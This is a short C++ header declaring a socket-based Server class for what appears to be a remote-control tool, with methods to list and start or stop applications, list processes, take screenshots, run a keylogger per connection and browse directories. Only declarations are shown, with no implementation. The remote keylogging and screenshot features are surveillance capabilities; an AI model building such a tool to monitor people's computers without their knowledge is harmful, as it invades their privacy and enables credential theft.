#pragma once
#include "../InLibs.h"
#include "Helper.h"
#include <map>
#include <thread>
#include <vector>
#define BACKLOG 10

class Server {
private:
    int listener;
    int disfd;
    std::vector<pollfd> pfds;
    std::map<int, std::string> _clientIP;
    Keylogger _keylogger;
public:
    Server();
    ~Server();

    void start();

    Response listApp();  
    Response startApp(const char *appName);
    Response stopApp(const char *appName);
    
    Response listProcesss();

    Response screenshot();

    Response startKeylog(int sockfd);
    Response stopKeylog(int sockfd);

    Response dirTree(const char *pathName); 
};